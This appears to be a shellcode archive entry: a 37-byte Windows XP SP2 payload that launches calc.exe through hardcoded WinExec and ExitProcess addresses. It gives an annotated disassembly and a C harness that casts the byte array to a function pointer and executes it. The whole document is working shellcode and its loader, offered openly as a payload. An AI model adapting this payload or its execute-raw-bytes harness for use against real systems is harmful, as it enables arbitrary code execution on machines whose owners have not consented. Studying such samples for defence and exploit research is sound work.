/*
#[+] Author: e55db081d05f58a
#[+] Title: Shellcode: win32/xp sp2 calc.exe 37 bytes
#[+] Type:Shellcode
#[+] Tested on: WinXp 32bit SP2
#[+] Twitter: @e55db081d05f58a
=====================================================

=====================================================
Disassembly of section .text:
00401000 <.text>:
401000: 31 c0 xor %eax,%eax
401002: 31 d2 xor %edx,%edx
401004: 52 push %edx
401005: 68 2e 65 78 65 push $0x6578652e
40100a: 68 63 61 6c 63 push $0x636c6163
40100f: 89 e0 mov %esp,%eax
401011: 6a 01 push $0x1
401013: 50 push %eax
401014: bb 4d 11 86 7c mov $0x7c86114d,%ebx << mov ebx,kernel32.WinExec
401019: ff d3 call *%ebx
40101b: 6a 01 push $0x1
40101d: bb a2 ca 81 7c mov $0x7c81caa2,%ebx << mov ebx,kernel32.ExitProcess
401022: ff d3 call *%ebx
*/
#include <stdio.h>
#include <string.h>
int main(int argc,char** argv){
  char shellcode[]="\x90"
                   "\x31\xc0"
                   "\x31\xd2"
                   "\x52"
                   "\x68\x2e\x65\x78\x65"
                   "\x68\x63\x61\x6c\x63"
                   "\x89\xe0"
                   "\x6a\x01"
                   "\x50"
                   "\xbb\x4d\x11\x86\x7c"
                   "\xff\xd3"
                   "\x6a\x01"
                   "\xbb\xa2\xca\x81\x7c"
                   "\xff\xd3";
  int(*f)();
  f=(int(*)())shellcode;
  printf("Length: %d\n",strlen(shellcode));
  (int)(*f)();
  return 0;
}
